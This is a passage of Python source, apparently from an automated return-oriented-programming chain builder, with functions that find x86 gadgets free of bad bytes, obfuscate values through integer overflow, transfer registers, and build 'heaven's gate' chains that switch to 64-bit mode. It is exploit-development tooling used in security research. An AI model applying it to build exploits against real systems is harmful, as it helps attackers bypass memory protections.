		dp (hex(obf1), hex(obf2))
	for reg in excludeRegs:
		availableRegs.remove(reg)
	# print ("availableRegs",availableRegs)
	espDesiredMovement=4

	addEspMove=0
	for r in availableRegs:
		foundAdd,aP1,addD1,reg,reg2,addStackMov = findAddRegReg(r,bad,availableRegs,excludeRegs, addEspMove)
		if not foundAdd:
			# dp ("hit the continue")
			continue
		foundP1, p1, popD1 = findPop(r,bad,True,excludeRegs)
		foundP2, p2, popD2 = findPop(reg2,bad,True,excludeRegs)
		if withPR:
			foundPu1, pu1, pushD1 = findPush(r,bad,True,excludeRegs)
		if foundAdd and foundP1 and foundP2 and foundPu1:
			dp ("got build int overflow template")
			buildSucces=True
			break
	
	if not buildSucces:
		# print ("IN ALTERNATE buildIntOverflowPR template")
		# print ("availableRegs", availableRegs)
		for r in availableRegs:
			foundAdd,aP1,addD1,reg,reg2,addStackMov = findAddRegReg(r,bad,availableRegs, excludeRegs, addEspMove)
			if not foundAdd:
				continue
			### neeed add desired movement
			#### create loop for desireved move - incrementing by 4 - will check already emulateds
			foundP1, p1, popD1 = findPop(r,bad,False,excludeRegs,4)
			foundP2, p2, popD2 = findPop(reg2,bad,False,excludeRegs,4)
			foundPu1=True
			if withPR:
				foundPu1, pu1, pushD1 = findPush(r,bad,False,excludeRegs,-4)
			if foundAdd and foundP1 and foundP2 and foundPu1:
				dp ("got build int overflow template ALTERNATE")
				buildSucces=True
				break
	if buildSucces:

		tryThis=tryThisFunc(goal)
	
		dp ("\n\n-----integer overflow")
		p1Obj=addChain(popD1[p1], "load obfsucated value for int overflow", [obf1], intDict,0)
		p2Obj=addChain(popD2[p2], "load obfsucated value for int overflow", [obf2], intDict,1)
		addObj=addChain(addD1[aP1], "generate deobfuscated: 0x" + hx(goal,8) + tryThis, [], intDict,2)
		package=[p1Obj, p2Obj,addObj]
		if withPR:
			tTh=tryThisFunc(goal)
			prObj=addChain(pushD1[pu1], "Push/ret - going to 0x" + hx(goal,8) + tTh, [], intDict,3)
			package.extend([prObj])

		# p1Obj.setObf("intOverflow",[p1Obj, p2Obj,addObj,prObj] )

		frc.intOverflow[0]=intDict
		# showChain(intDict)
		genOutput(intDict)
		# dp ("\n\n-----\n")
		return buildSucces,  package
	return buildSucces, []

def buildIntOverflowPA(excludeRegs,bad,goal,bb):  # push / add / no push/ret
	dp("buildIntOverflowPA")
	availableRegs=["eax", "ebx","ecx","edx", "esi","edi","ebp"]
	aP1=0
	p1=0
	p2=0
	intDict={}
	buildSucces=False
	success, obf1,obf2=buildObfValuesIntOverflow(goal,bad,bb)
	if not success:
		dp ("Cannot find desired integer overflow")
		return False,1,2,3,4
	if success:
		dp ("Got obfuscation values for integer oveflow:")
		dp (hex(obf1), hex(obf2))
	for reg in excludeRegs:
		availableRegs.remove(reg)
	espDesiredMovement=4
	addEspMove=0
	for r in availableRegs:
		foundAdd,aP1,addD1,reg,reg2,addStackMov = findAddRegReg(r,bad,availableRegs,excludeRegs, addEspMove)
		if not foundAdd:
			# dp ("hit the continue")
			continue
		foundP1, p1, popD1 = findPop(r,bad,True,excludeRegs)
		foundP2, p2, popD2 = findPop(reg2,bad,True,excludeRegs)
		if foundAdd and foundP1 and foundP2:
			dp ("got build int overflow template")
			buildSucces=True
			break
	if not buildSucces:
		for r in availableRegs:
			foundAdd,aP1,addD1,reg,reg2,addStackMov = findAddRegReg(r,bad,availableRegs, excludeRegs, addEspMove)
			if not foundAdd:
				continue
			### neeed add desired movement
			#### create loop for desireved move - incrementing by 4 - will check already emulateds
			foundP1, p1, popD1 = findPop(r,bad,False,excludeRegs,4)
			foundP2, p2, popD2 = findPop(reg2,bad,False,excludeRegs,4)

			if foundAdd and foundP1 and foundP2:
				dp ("got build int overflow template ALTERNATE")
				buildSucces=True
				break
	if buildSucces:
		try:
			tryThis= " -> " + disOffset(goal)
		except:
			tryThis=""
		dp ("\n\n-----integer overflow")
		p1Obj=addChain(popD1[p1], "load obfsucated value for int overflow", [obf1], intDict,0)
		p2Obj=addChain(popD2[p2], "load obfsucated value for int overflow", [obf2], intDict,1)
		addObj=addChain(addD1[aP1], "generate deobfuscated: 0x" + hx(goal,8) + tryThis, [], intDict,2)
		showChain(intDict)
		# dp ("\n\n-----\n")
		return buildSucces,  p1Obj, p2Obj,addObj
	return buildSucces,1,2,3,4

def findPushOold2(reg,bad,length1, excludeRegs,espDesiredMovement=-4):
	dp ("findPush", reg)
	bExists, myDict=fg.getFg("push",reg)
	if bExists:
		if length1 or not length1:  # was if length1  - this way it will always try length1 first - ideal, perfect gadget, push eax / ret
			for p in myDict:
				freeBad=checkFreeBadBytes(opt,fg,p,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"])

				if myDict[p].length ==1 and myDict[p].opcode=="c3" and freeBad:
					dp ("found findpush", reg)
					return True,p, myDict
			return False,0,0
			
		if not length1: # was else
			dp ("findpush clob")
			pushExists, p1, myDict, rObj = rop_testerFindClobberFree(("push",reg), excludeRegs,bad, "c3", espDesiredMovement,[reg])
			if pushExists:
				dp ("found findpush alt", reg)
				return True,p1, myDict
			else:
				return False,0,0
	else:
		# dp ("return false findpush")
		return False,0,0

def find2PopsCompact (first,second,bad,excludeRegs):
	foundPops,p1, d1, p2, d2 = find2Pops(first,second,bad,True, excludeRegs)
	if foundPops:
		dp("\t***************\n\n2both pops exists", first, hex(p1))
		return foundPops,p1,p2
	else:
		foundPops,p1, d1, p2, d2 = find2Pops(first,second,bad,False, excludeRegs)
		if foundPops:
			dp("\t***************\n\n2both pops exists alt", first, hex(p1))
			return foundPops,p1, p2
	return False, 0,0

def findPushRetCompact(excludeRegs, bad, availableRegs, length1):
	for r in availableRegs:
		foundPR, p3, popD3, pu1, pushD1 = findPushRet(r, excludeRegs,bad, length1)
		return foundPR, p3, pu1
		# if foundPR:
		# 	break
	return False, 2,2


def findPushRet(reg,excludeRegs,bad, length1, anyR=False):
	p1=0
	pu1=0
	popD1=0
	pushD1=0
	if anyR ==False:
		availableRegs=[reg]
	else:
		availableRegs=["eax", "ebx","ecx","edx", "esi","edi","ebp"]
		for r1 in excludeRegs:
			availableRegs.remove(r1)

	for r in availableRegs:
		foundPu1, pu1, pushD1 = findPush(r,bad,True,excludeRegs)
		foundP1, p1, popD1 = findPop(r,bad,True,excludeRegs)
		if foundPu1 and foundP1:
			dp("\t***************\n\npr found push and pop", hex(pu1))
			dp ("\t",disMini(pushD1[pu1].raw, pushD1[pu1].offset))
			dp ("\t",disMini(popD1[p1].raw, popD1[p1].offset))
			return True,p1, popD1, pu1, pushD1
		# else:
	if not length1:
		for r in availableRegs:
			foundPu1, pu1, pushD1 = findPush(r,bad,False,excludeRegs)
			foundP1, p1, popD1 = findPop(r,bad,False,excludeRegs)
			if foundPu1 and foundP1:
				dp("\t***************\n\npr found push and pop alt", hex(pu1))
				dp ("\t",disMini(pushD1[pu1].raw, pushD1[pu1].offset))
				dp ("\t",disMini(popD1[p1].raw, popD1[p1].offset))
				return True,p1, popD1, pu1, pushD1
	return False, 1,2,3,4

def find2Pops(reg,reg2,bad,length1, excludeRegs,espDesiredMovement=4):
	dp ("find2Pops", reg,reg2)
	if length1:
		dp ("length1")
		foundP1, p1, popD1 = findPop(reg,bad,True,excludeRegs)
		foundP2, p2, popD2 = findPop(reg2,bad,True,excludeRegs)
		if foundP1 and foundP2:
			return True,p1, popD1, p2, popD2
	if not length1:
		foundP1, p1, popD1 = findPop(reg,bad,False,excludeRegs,4)
		foundP2, p2, popD2 = findPop(reg2,bad,False,excludeRegs,4)
		if foundP1 and foundP2:
			dp ("got both in find2Pops")
			return True,p1, popD1, p2, popD2
	# dp ("return false find2Pops")
	return False, 0,0,0,0


def addChain(gadget, comment, stack, myDict, index=None):
	if type(gadget)==int:
		gadget=fg.rop[gadget]
	obj = ropChainObj(gadget,comment,stack,index)

	if type(myDict)==dict:
		myDict[index]=obj
	elif type(myDict)==list:
		myDict.append(obj)
	return obj

def chainObj(gadget, comment, stack,index=None):
	if type(gadget)==int:
		gadget=fg.rop[gadget]
	obj = ropChainObj(gadget,comment,stack,None)
	return obj

def CopyChainObj(gadgetObj, comment=None):
	if comment==None:
		obj = ropChainObj(gadgetObj.g,gadgetObj.comment,gadgetObj.stack,gadgetObj.id)
	else:
		obj = ropChainObj(gadgetObj.g,comment,gadgetObj.stack,gadgetObj.id)

	return obj

def giveBad(oldBad,flag):
	#deprecated
	bad = b''  
	if not flag:
		return bad
	else:
		return oldBad

def getHGandPops(hgExcludeRegs,excludeRegs,bad,availableRegs,pu1, destination):
	#this function is deprecated, not used
	noBad=b''
	oldBad=bad
	hFound=False
	p1Found=False
	p2Found=False

	for p in fg.hgGadgets:
		freeBad=checkFreeBadBytes(opt,fg,p,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"])

		first=fg.hgGadgets[p].hg1
		second=fg.hgGadgets[p].hg2
		if fg.hgGadgets[p].hgDiff==0 and freeBad and any(item in first for item in availableRegs)  and any(item in second for item in availableRegs):
			hFound=True
			foundPops,p1, p2 = find2PopsCompact (first,second,bad,excludeRegs)
			if foundPops:
				tTp=tryThisFunc(p)
				tTpu=tryThisFunc(pu1)
				rp1=chainObj(p1, "first pop", [0x33])
				rp2=chainObj(p2, "second pop " + tTp , [img(p)])
				rdp=chainObj(p, "Double push heaven's gate gadget #1", [])	
				rp1p2=[rp1,rp2,rdp]
				rp3p4= copy.deepcopy(rp1p2)
				rp3p4[0].app([destination],"third pop - destination")
				rp3p4[1].app("forth pop - push/ret " + tTpu,[img(pu1)])
				rp3p4[2].modCom( "Double push heaven's gate gadget #1")
				# showChain(rp1p2)
				# showChain(rp3p4)
				rp1p2.extend(rp3p4)
				return foundPops, rp1p2
	# entered only if no bad-byte free version found - this one finds iwth bad bytes then uses obfuscation
	
	for p in fg.hgGadgets:
		package=[]
		if hFound:
			freeBad=checkFreeBadBytes(opt,fg,p,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"])

		if not hFound:
			# freeBad=checkFreeBadBytes(opt,fg,p,giveBad(bad,hFound))  
			freeBad=checkFreeBadBytes(opt,fg,p,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"])

		first=fg.hgGadgets[p].hg1
		second=fg.hgGadgets[p].hg2
		if fg.hgGadgets[p].hgDiff==0 and freeBad and any(item in first for item in availableRegs)  and any(item in second for item in availableRegs):
			foundPops,p1, p2 = find2PopsCompact (first,second,bad,excludeRegs)
			if foundPops:
				tTp=tryThisFunc(p)
				tTpu=tryThisFunc(pu1)

				rp1=chainObj(p1, "loading the selecter - 0x33 -> 64-bit", [0x33])
				rp2=chainObj(p2, "second pop " + tTp, [img(p)])
				rp3=chainObj(p1, "third pop - the final destination ", [destination])
				rp4=chainObj(p2, "forth pop - going to a single push gadget " + tTpu, [img(pu1)])
				rp1p2=[rp1,rp2]
				rp3p4=[rp3,rp4]
			# foundPops=False  # make artifically false to invoke remake for testing
			if not foundPops:
				test3=[]
				foundPops, rp1p2 = remakeWithObf(find2PopsCompact, 2, first,second,bad,excludeRegs)
				if not foundPops:
					continue
				else:
					showChain(rp1p2)
					rp3p4= copy.deepcopy(rp1p2)
					rp1p2[3].app([0xbaddbadd,0x33],"first pop")
					rp1p2[7].app([0xbaddbadd,p], "second pop")
					dp ("types", type(rp1p2[0]), type(rp3p4[0]))
					rp3p4[3].app([0xbaddbadd,0xdeadc0de],"third pop - destination")
					rp3p4[7].app([0xbaddbadd,pu1], "forth pop - push/ret")
					dp ("\n\n")
					showChain(rp1p2)
					showChain(rp3p4)
			rdp=chainObj(p, "Double push heaven's gate gadget #1", [])	
			rdp2=chainObj(p, "Double push heaven's gate gadget #2", [])	


			rdp=[rdp]
			rdp2=[rdp2]
			# hFound=False  # make artifically false to invoke remake for testing
			if not hFound:   # making the heaven's gate double push push ret
				pTh=tryThisFunc(p)
				remakeSuccess, rdp =buildIntOverflowPR(popExcludeRegs,bad,img(p),pTh,bb)  # goal is p, hggadget
				if remakeSuccess:
					# rdp=[p1Obj, p2Obj,addObj,prObj]
					rdp2=copy.deepcopy(rdp)
					rdp[-1].appCom("Double push heaven's gate gadget #1")
					rdp2[-1].appCom("Double push heaven's gate gadget #2")

				if not remakeSuccess:
					continue
			if foundPops:
				package.extend(rp1p2)
				package.extend(rdp)
				package.extend(rp3p4)
				package.extend(rdp2)
				dp ("\n\npackage2")
				showChain(package)
				return foundPops, package
	

	# addChain(p1, "first pop", [0x33], mList)
	# addChain(p2, "second pop", [p], mList)
	# addChain(p, "Double push heaven's gate gadget #1", [], mList)
	# addChain(p1, "first pop - the final destination ", [0xdeadc0de], mList)
	# addChain(p2, "second pop - going to a single push gadget ", [pu1], mList)
	# addChain(p, "Double push heaven's gate gadget #2", [], mList)

	return False,[]
def findAddTransfer(reg1,reg2, bad,length1,excludeRegs,espDesiredMovement,comment):
	
	if reg1==reg2:
		return False,0
	availableRegs={"eax","ebx","ecx","edx", "esi","edi","ebp"}
	for d in excludeRegs:
		try:
			availableRegs.remove(d)
		except:
			pass
	# availableRegs=list(availableRegs)
	# print ("reg1", reg1, "reg2",reg2)
	# print ("excludeRegs",excludeRegs)
	# print ("availableRegs",availableRegs)
	foundM1, m1 = findGenericOp2("add",reg2,reg1,bad,length1, excludeRegs,espDesiredMovement)
	if foundM1:
		val=0xffffffff 
		foundP1, p1, chP = loadReg(reg1,bad,length1,excludeRegs,val,comment)
		if foundP1:
			foundInc, iP = findGeneric("inc",reg1,bad,length1, availableRegs,espDesiredMovement)
			if foundInc:
				gM=chainObj(m1, comment, [])
				package=pkBuild([chP,iP, gM])
				# showChain(package, True)
				return True, package

	return False,0
def findAddRegsVal(reg1,reg2, val, bad,length1,excludeRegs,espDesiredMovement,comment):
	# print (red,"findAddRegsVal excludeRegs", res,excludeRegs)
	# input()
	if reg1==reg2:
		return False,0
	availableRegs={"eax","ebx","ecx","edx", "esi","edi","ebp"}
	for d in excludeRegs:
		try:
			availableRegs.remove(d)
		except:
			pass
	if reg1 in excludeRegs:
		return False,0
	if reg2 in excludeRegs:
		return False,0
	# availableRegs=list(availableRegs)
	# print ("reg1", reg1, "reg2",reg2)
	# print ("excludeRegs",excludeRegs)
	# print ("availableRegs",availableRegs)
	foundA1, a1 = findGenericOp2("add",reg2,reg1,bad,length1, excludeRegs,espDesiredMovement)
	if foundA1:
		foundP1, p1, chP = loadReg(reg2,bad,length1,excludeRegs,val,comment)
		if foundP1:
			gA=chainObj(a1, comment, [])
			package=pkBuild([chP, gA])
			# showChain(package, True)
			return True, package
	return False,0

def findSubTransfer(reg1,reg2, bad,length1,excludeRegs,espDesiredMovement,comment, excludeXor=False,excludeXchg=False, excludeSub=False,excludePushPop=False, excludeDeeper=False):
	# print (gre, "findXorTransfer", "reg1",reg1, "reg2",reg2, res)
	if reg1==reg2:
		return False,0

	availableRegs={"eax","ebx","ecx","edx", "esi","edi","ebp"}
	for d in excludeRegs:
		try:
			availableRegs.remove(d)
		except:
			pass
	# availableRegs=list(availableRegs)
	# print ("reg1", reg1, "reg2",reg2)
	# print ("excludeRegs",excludeRegs)
	# print ("availableRegs",availableRegs)
	instruction ="sub"
	# xor ebx, ecx/key   (but could be: ebx, edx   -   as long as edx had key, etc)   ebx = reg2 - is is what is being transferred - ecx = reg1 -- will hold the transfered result
	# xor ecx, ebx  --- ecx holds what was in ebx
	excludeRegs=set(excludeRegs)

	bExists, myDict=fg.getFg(instruction,reg2)
	bExists2, myDict2=fg.getFg("add",reg1)
	hexaPattern = re.compile(r'(0x[0-9a-fA-F]+)|[0-9]+')
	isReg= re.compile( r'e[b|c|d|a]x|e[d|s]i|e[s|b]p', re.M|re.I)


	keyVal = 0x41424344
	
	if bExists and bExists2 and length1:	
		for p in myDict:
			isR=False
			isHex=False
			continueFlag=True
			continueFlag2=False
			# if continueFlag2:
			# 	break

			freeBad=checkFreeBadBytes(opt,fg,p,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"])
			isRegOp1= re.search( isReg,myDict[p].op1)
			# if isRegOp1:
			# 	print ("p", p, disOffset(p),"len", myDict[p].length, myDict[p].opcode,freeBad )
			if myDict[p].length ==1 and myDict[p].opcode=="c3" and freeBad and isRegOp1:
				dp ("found ",instruction, reg1) 
				# print ("p", p, disOffset(p),"len", myDict[p].length, myDict[p].opcode,freeBad )
				# print ("   --> reg2", myDict[p].op2)
				isHex = re.search(hexaPattern, myDict[p].op2)
				if isHex:
					# print ("isHex",myDict[p].op2)
					try:
						keyVal = int(myDict[p].op2,16)
					except:
						keyVal = int(myDict[p].op2)
					freeBad2=checkFreeBadBytes(opt,fg,keyVal,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"],True)
					if freeBad2:
						continueFlag=False
				else:
					isR = re.search(isReg, myDict[p].op2)
					if isR:
						if myDict[p].op2 not in excludeRegs:
						# print (cya,"isReg",myDict[p].op2, res)
							continueFlag=False
			if continueFlag:
				# print ("continueFlag",myDict[p].op2, disOffset(p))
				continue

			for q in myDict2:
				if isR:
					keyVal = 0x41424344
					freeBad3=checkFreeBadBytes(opt,fg,keyVal,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"])
					if not freeBad3:
						# print("Key value for XOR has bad bytes.")
						break
				freeBad=checkFreeBadBytes(opt,fg,q,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"])
				isRegOp1b= re.search( isReg,myDict2[q].op1)
				if myDict2[q].length ==1 and myDict2[q].opcode=="c3" and freeBad and isRegOp1b and myDict2[q].op2==reg2 and myDict2[q].op1==reg1:
					if isHex:
						# print ("ok1 p",cya,myDict[p].op1,disOffset(p),res,p)
						# print ("ok2 q",red, myDict2[q].op1,disOffset(q),res,q)
						foundP1, p1, chP = loadReg(reg1,bad,length1,excludeRegs, keyVal,comment)
						if foundP1:
							pk=pkBuild([p,chP,q])
							# print (blu,"This is a good one0",res)
							# showChain(pk,True)
							return True, pk
						pass
					elif isR:
						# print ("ok1 p",gre,myDict[p].op1,disOffset(p),res,p)
						# print ("ok2 q",red, myDict2[q].op1,disOffset(q),res,q)
						if myDict[p].op2 == reg1:
							pk=pkBuild([p,q])
							# print (red, "This is a good one1")
							# showChain(pk,True)
							# print (res)
							return True, pk
				####### Disabling for now - does not always work as we like
				if 2==3:
					if myDict2[q].length ==1 and myDict2[q].opcode=="c3" and freeBad and isRegOp1b and myDict2[q].op2!=reg2 and myDict2[q].op1==reg1 and isR and myDict2[q].op2==myDict[p].op2:
							
							if myDict[p].op2 != myDict[p].op1:
								# print ("ok1 p",gre,myDict[p].op1,disOffset(p),res,p)
								# print ("ok2 q",red, myDict2[q].op1,disOffset(q),res,q)						
								excludeRegs2= copy.deepcopy(excludeRegs)
								excludeRegs2.add(reg1)
								excludeRegs2.add(myDict[p].op1)

								foundT, gT = findUniTransfer("2",reg1,myDict[p].op1, bad,length1,excludeRegs2,espDesiredMovement, "Transfer " +myDict[p].op1+" to " + reg1,excludeXor,excludeXchg, True,excludePushPop)
								# foundT=False
								if foundT:
									pk=pkBuild([p,gT,q])
									# print (cya,"This is a good one2", reg1,reg2)
									# showChain(pk,True)
									# print(res)
									return True, pk
			
			continueFlag2=True
	return False,0
def findXorTransfer(reg1,reg2, bad,length1,excludeRegs,espDesiredMovement,comment):
	# print (gre, "findXorTransfer", "reg1",reg1, "reg2",reg2, res)
	if reg1==reg2:
		return False,0

	availableRegs={"eax","ebx","ecx","edx", "esi","edi","ebp"}
	for d in excludeRegs:
		try:
			availableRegs.remove(d)
		except:
			pass
	# availableRegs=list(availableRegs)
	# print ("reg1", reg1, "reg2",reg2)
	# print ("excludeRegs",excludeRegs)
	# print ("availableRegs",availableRegs)
	instruction ="xor"
	# xor ebx, ecx/key   (but could be: ebx, edx   -   as long as edx had key, etc)   ebx = reg2 - is is what is being transferred - ecx = reg1 -- will hold the transfered result
	# xor ecx, ebx  --- ecx holds what was in ebx
	excludeRegs=set(excludeRegs)

	bExists, myDict=fg.getFg(instruction,reg2)
	bExists2, myDict2=fg.getFg(instruction,reg1)
	hexaPattern = re.compile(r'(0x[0-9a-fA-F]+)|[0-9]+')
	isReg= re.compile( r'e[b|c|d|a]x|e[d|s]i|e[s|b]p', re.M|re.I)


	keyVal = 0x41424344
	
	if bExists and bExists2 and length1:	
		for p in myDict:
			isR=False
			isHex=False
			continueFlag=True
			continueFlag2=False
			# if continueFlag2:
			# 	break

			freeBad=checkFreeBadBytes(opt,fg,p,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"])
			isRegOp1= re.search( isReg,myDict[p].op1)
			# if isRegOp1:
			# 	print ("p", p, disOffset(p),"len", myDict[p].length, myDict[p].opcode,freeBad )
			if myDict[p].length ==1 and myDict[p].opcode=="c3" and freeBad and isRegOp1:
				dp ("found ",instruction, reg1) 
				# print ("p", p, disOffset(p),"len", myDict[p].length, myDict[p].opcode,freeBad )
				# print ("   --> reg2", myDict[p].op2)
				isHex = re.search(hexaPattern, myDict[p].op2)
				if isHex:
					# print ("isHex",myDict[p].op2)
					try:
						keyVal = int(myDict[p].op2,16)
					except:
						keyVal = int(myDict[p].op2)
					freeBad2=checkFreeBadBytes(opt,fg,keyVal,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"],True)
					if freeBad2:
						continueFlag=False
				else:
					isR = re.search(isReg, myDict[p].op2)
					if isR:
						if myDict[p].op2 not in excludeRegs:
						# print (cya,"isReg",myDict[p].op2, res)
							continueFlag=False
			if continueFlag:
				# print ("continueFlag",myDict[p].op2, disOffset(p))
				continue

			
			for q in myDict2:
				if isR:
					keyVal = 0x41424344
					freeBad3=checkFreeBadBytes(opt,fg,keyVal,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"])
					if not freeBad3:
						# print("Key value for XOR has bad bytes.")
						break

				freeBad=checkFreeBadBytes(opt,fg,q,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"])
				isRegOp1b= re.search( isReg,myDict2[q].op1)
				if myDict2[q].length ==1 and myDict2[q].opcode=="c3" and freeBad and isRegOp1b and myDict2[q].op2==reg2 and myDict2[q].op1==reg1:
					if isHex:
						# print ("ok1 p",cya,myDict[p].op1,disOffset(p),res,p)
						# print ("ok2 q",red, myDict2[q].op1,disOffset(q),res,q)
						foundP1, p1, chP = loadReg(reg1,bad,length1,excludeRegs, keyVal,comment)
						if foundP1:
							pk=pkBuild([p,chP,q])
							# print (blu,"This is a good one0",res)
							# showChain(pk,True)
							# return True, pk
						pass
					elif isR:
						# print ("ok1 p",gre,myDict[p].op1,disOffset(p),res,p)
						# print ("ok2 q",red, myDict2[q].op1,disOffset(q),res,q)
						if myDict[p].op2 == reg1:
							pk=pkBuild([p,q])
							# print ("This is a good one1")
							# showChain(pk,True)
							# return True, pk
						else:	
							# print ("ok1 p",gre,myDict[p].op1,disOffset(p),res,p)
							# print ("ok2 q",red, myDict2[q].op1,disOffset(q),res,q)	
							excludeRegs2= copy.deepcopy(excludeRegs)
							excludeRegs2.add(myDict2[q].op1)
							excludeRegs2.add(myDict[p].op2)

							foundT, gT = findUniTransfer("3",myDict2[q].op1,myDict[p].op2, bad,length1,excludeRegs2,espDesiredMovement, "Transfer " +myDict[p].op1+" to " + reg1,True)
							# foundT=False
							if foundT:
								pk=pkBuild([p,gT,q])
								# print ("This is a good one2",red)
								# showChain(pk,True)
								# print(res)
								# return True, pk

							else:
								if myDict[p].op2 != "esp" and myDict2[q].op1 != "esp":
									foundP2, p2, chP2 = loadReg(myDict[p].op2,bad,length1,excludeRegs, keyVal,comment)
									foundP3, p3, chP3 = loadReg(myDict2[q].op1,bad,length1,excludeRegs, keyVal,comment)

									if foundP2:
										pk=pkBuild([chP2,p,chP3,q])
										# print ("This is a good one3")
										# showChain(pk,True)
										# return True, pk
			
			continueFlag2=True
		return False,0

	#not set up below
	if bExists and bExists2 and not length1:
		for p in myDict:
			freeBad=checkFreeBadBytes(opt,fg,p,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"])

			freeBad=False
			if myDict[p].length ==1 and myDict[p].opcode=="c3" and freeBad:
				dp ("found ", instruction, reg1)
				return True,p, myDict
			dp (instruction," clob")
			mdExist, m1, myDict, rObj = rop_testerFindClobberFree((instruction,reg1), excludeRegs,bad, "c3", espDesiredMovement,[])
			if mdExist:
				dp ("found alt", instruction, reg1)
				return True,m1
			else:
				return False,0
	else:
		dp ("it does not exist")
		# dp ("return false ", instruction)
		return False,0


	foundM1, m1 = findGenericOp2("add",reg2,reg1,bad,length1, excludeRegs,espDesiredMovement)
	if foundM1:
		val=0xffffffff 
		foundP1, p1, chP = loadReg(reg1,bad,length1,excludeRegs,val,comment)
		if foundP1:
			foundInc, iP = findGeneric("inc",reg1,bad,length1, availableRegs,espDesiredMovement)
			if foundInc:
				gM=chainObj(m1, comment, [])
				package=pkBuild([chP,iP, gM])
				# showChain(package, True)
				return True, package

	return False,0
def findUniTransfer(caller,reg,op2, bad,length1,excludeRegs,espDesiredMovement,comment="", excludeXor=False,excludeXchg=False, excludeSub=False,excludePushPop=False, excludeDeeper=False,ID=None):
	# print (red,"findTransfer", caller, reg, op2,res, yel,"excludeXor", gre,excludeXor, yel,"excludeSub", gre,excludeSub,yel,"excludePushPop", gre,excludePushPop, yel,"excludeDeeper", gre,excludeDeeper, yel,"ID",gre,ID,res)
	global prevCaller
	global deeperLimit

	if prevCaller != caller:
		deeperLimit=0
	prevCaller=caller

	try:
		if comment==None:
			comment=""
		# if 2==3 or excludeXor or excludeXchg or excludeSub or excludePushPop:
		foundM1, m1 = findGenericOp2("mov",op2,reg,bad,length1, excludeRegs,espDesiredMovement)
		if foundM1:
			gM=chainObj(m1, comment, [])
			package=[gM]
			showChain(package)
			return True, package

		if not excludeXchg:
			foundT, x1 = xchgMovReg(reg,op2, bad,length1,excludeRegs,espDesiredMovement)
			if foundT:
				gM=chainObj(x1, comment, [])
				package=[gM]
				showChain(package)
				return True, package

		foundAT, gAT= findAddTransfer(reg,op2, bad,length1,excludeRegs,espDesiredMovement,comment)
		if foundAT:
			return True, gAT

		if not excludeXor:
			foundXT, gXT= findXorTransfer(reg,op2, bad,length1,excludeRegs,espDesiredMovement,comment)
			if foundXT:
				return True, gXT

		if not excludeSub:
			foundST, gST= findSubTransfer(reg,op2, bad,length1,excludeRegs,espDesiredMovement,comment,excludeXor,excludeXchg, True,excludePushPop, excludeDeeper)
			if foundST:
				return True, gST
			
		if not excludePushPop:
			foundMEsp, mEsp, newReg,stackPivotAmount,c3Status,c2Adjust = getPushPopReg(op2, reg,excludeRegs,espDesiredMovement)	
			# foundMEsp=False
			if foundMEsp:
				if stackPivotAmount ==0:
					cPuPo=chainObj(mEsp,  "Transfer "+op2 + " to " + reg, [])
				else:
					filler=genFiller(stackPivotAmount)
					cPuPo=chainObj(mEsp,  "Transfer(2) "+op2 + " to " + reg, filler)
				cPuPo=pkBuild([cPuPo])
				return True, cPuPo
		if not excludeDeeper and checkDeeperLimit():
			foundMEsp, pk = deeperGetPushPopReg(op2, reg,excludeRegs,espDesiredMovement,bad,True,	False,False)
			if foundMEsp:
				return True, pk
		return False, 0
	except Exception as e:
		print ("exception - findUniTransfer")
		print(e)
		print(traceback.format_exc())
	return False,0

deeperLimit=0
prevCaller="666"
def checkDeeperLimit():
	global deeperLimit

	if deeperLimit>2:
		deeperLimit=0
		return False
	else:
		deeperLimit+=1
		return True

def deeperGetPushPopReg(op2, reg,excludeRegs,espDesiredMovement, bad,length1,regMatch=True, c3Only=True,notESP=True,):
	global deeperLimit
	# print (yel,"deeperGetPushPopReg", reg, op2, gre,deeperLimit,res)
	try:
		foundMEsp, mEsp, newReg,stackPivotAmount,c3Status,c2Adjust = getPushPopReg(op2, reg,excludeRegs,espDesiredMovement,False,False)
		if foundMEsp:
			foundT, gT4 = findUniTransfer("4-Deeper",reg,newReg, bad,length1,excludeRegs,espDesiredMovement, "Transfer " +reg+" to " + newReg, False,False,False,False,False)
			if foundT:
				filler2=[]
				if stackPivotAmount ==0:
					cMEsp=chainObj(mEsp,  "Transfer(3) reg to " + newReg, [])
					# if c3Status!="c3":
					# 	cMEsp=chainObj(mEsp,  "Transfer(4) reg to ",[])
					# 	filler2=genFiller(c2Adjust)
					# 	gT4[0].modStackAddFirst(filler2)
				else:
					filler=genFiller(stackPivotAmount)
					cMEsp=chainObj(mEsp,  "Transfer(5) reg to " + newReg, filler)
					# if c3Status!="c3":
					# 	filler2=genFiller(c2Adjust)
					# 	gT4[0].modStackAddFirst(filler2)
				pk=pkBuild([cMEsp,gT4])
				return True, pk
		return False,0
	except Exception as e:
		print ("exception - deeperGetPushPopReg")
		print(e)
		print(traceback.format_exc())
	return False,0


def xchgMovReg(reg,op2, bad,length1,excludeRegs,espDesiredMovement):
	dp ("xchgMovReg", reg, op2)
	foundX, x1 = findXchg(reg,op2,bad,length1, excludeRegs,espDesiredMovement)
	dp ("xchgMovReg returning ", foundX)
	if foundX:
		return foundX, x1
	else:
		return False, 0

def lXorAdd(reg,val,bad,length1,excludeRegs,espDesiredMovement,isVal=False):
	availableRegs=["eax","ebx","ecx","edx", "esi","edi","ebp"]
	try:
		excludeRegs.remove("esp")
	except:
		pass
	for d in excludeRegs:
		try:
			availableRegs.remove(d)
		except:
			pass

	for r in availableRegs:
		# foundXor, x1 = findGeneric("xor",reg,bad,length1, excludeRegs,espDesiredMovement)
		foundXor, x1 = findGenericOp2("xorZero", reg,reg,bad,length1, excludeRegs,espDesiredMovement,isVal)
		
		foundAdd, a1 = findGenericOp2("add", r,reg,bad,length1, excludeRegs,espDesiredMovement,isVal)
		foundP1, p1,pDict=findPop(r,bad,length1,excludeRegs,isVal)
		if foundXor and foundP1 and foundAdd:
				chP=chainObj(p1, "Indirectly loading " +reg, [val])
				pk=pkBuild([x1,chP,a1])
				dp ("pk",pk)
				showChain(pk)
				return True, pk
	return False,0x666


